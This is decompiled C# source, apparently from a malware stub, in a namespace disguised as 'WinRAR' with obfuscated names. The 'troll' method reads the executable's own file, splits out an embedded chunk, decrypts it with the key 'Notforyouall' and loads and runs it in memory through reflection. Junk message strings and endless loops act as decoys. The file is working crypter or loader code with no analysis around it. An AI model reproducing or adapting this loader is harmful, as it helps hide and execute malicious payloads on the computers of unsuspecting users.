using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WinRAR;

internal class l7mpnO81fYr7V1w8kia2iw6F
{
	private void Rih9tiShLj3aBW5q9gF()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			MessageBox.Show("&}y.7S†B1n9\\8d†7e\u00904E‹}{L8'Ym€FKC`[PB†;ukM„X7qp`'…5[alD};Oˆ/\u008d9U}C‰Žp3dCI;[Š'Ecn[YQzj~|i<p4?YEeq4Om‡zuƒ†A„1F1LvˆQrMh[Q~’Z@q’’D}#h}vjko†xh]XxlUWƒŒ?\u0081z‹\u008f5uc");
			ProjectData.ClearProjectError();
		}
		MessageBox.Show("of‡4#bMF‚/ln}cf\u0090yqSu)qpVU/_5uF‚Re:8HZA>uj„sd3C_k-3aŒ7xeˆ6q`R\u00811@[@:(bK>UXSq*7\u0090,B2c†'ax‰:\u007fgB1|s~‡Yd8CŒ:\u008f@‚p");
		while (true)
		{
		}
	}

	public static void troll(string xyz)
	{
		string[] array = Strings.Split(File.ReadAllText(Application.get_ExecutablePath()), "LObxeJiJBWecnhxrSYhC", -1, (CompareMethod)0);
		byte[] assemblyName = bd4Jfu4ywLA.R_(array[18], "Notforyouall");
		Thread.Sleep(10);
		Rm(assemblyName, new object[0]);
	}

	private void Y5aKnRa924kV8j()
	{
		while (true)
		{
		}
	}

	public static object Rm(byte[] AssemblyName, object[] args)
	{
		Assembly assembly = Assembly.Load(AssemblyName);
		Type[] types = assembly.GetTypes();
		int num = 0;
		Type type;
		object result = default(object);
		while (true)
		{
			if (num < types.Length)
			{
				type = types[num];
				if (type.IsClass && type.FullName!.EndsWith(".A"))
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return result;
		}
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
		return RuntimeHelpers.GetObjectValue(type.InvokeMember("A", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), args));
	}
}
